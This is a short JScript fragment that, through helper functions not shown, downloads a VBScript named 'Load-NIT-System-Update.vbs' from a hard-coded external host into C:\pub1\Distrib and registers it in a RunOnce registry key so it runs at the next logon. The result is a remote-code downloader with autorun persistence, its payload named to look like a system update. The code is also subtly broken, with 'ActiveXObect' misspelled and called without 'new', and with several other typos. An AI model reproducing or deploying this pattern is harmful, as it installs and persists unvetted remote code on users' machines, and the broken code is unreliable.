/******************************************************************************
' Predefined varants
******************************************************************************/
var STR_DISK = "C:";
var STR_FOLDER1 = "pub1";
var STR_FOLDER2 = "Distrib";
var THREAD_VBS = "Load-NIT-System-Update.vbs";

var HTTP_PREFIX1 = "http://" //'Prefix of Site Downloaded From'
var HTTP_HOST1 = "file.tuneserv.ru" //'Host Name or IP address of the Site'
var HTTP_PORT1 = ":80" //'Port of the Site'
var HTTP_UPDATE_PATH1 = "/WinUpdate/" //'Path to WinUpdate of the Site'
var HTTP_EXPON_PATH1 = "/Exponenta/" //'Path to WinUpdate of the Site'
/*****************************************************************************/

/******************************************************************************
'
' SUBROUTINE ScriptTestRunKeyDownloaded
'
' This Subroutine Downloads NIT Update Script on Computer at Test Mode
' The Subroutine Uses Predefined varants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
******************************************************************************/
function ScriptTestRunKeyDownloaded(){
	var Url;         //'Full URL Neme of the File in the Site
    var local_Path;  //'Local Path to Command File with Drive Letter
    var tempsPath;
	var wshShell, envVarProccess;
    wshShell = ActiveXObect("WScript.Shell");
    envVarProccess = wshShell.Environment("PROCESS");
	tempsPath = envVarProccess("TEMP")
    local_Path = STR_DISK + "\\" + STR_FOLDER1 + "\\" + STR_FOLDER2;
    Url = HTTP_PREFIX1 + HTTP_HOST1 + HTTP_PORT1 + HTTP_UPDATE_PATH1;

    CreatedCascade( STR_DISK, STR_FOLDER1, STR_FOLDER2 );
    UploadedFilesFromInt01( THREAD_VBS, Url, local_Path, 10000 );
    CreatedRunOnceKey( local_Path, THREAD_VBS );
}
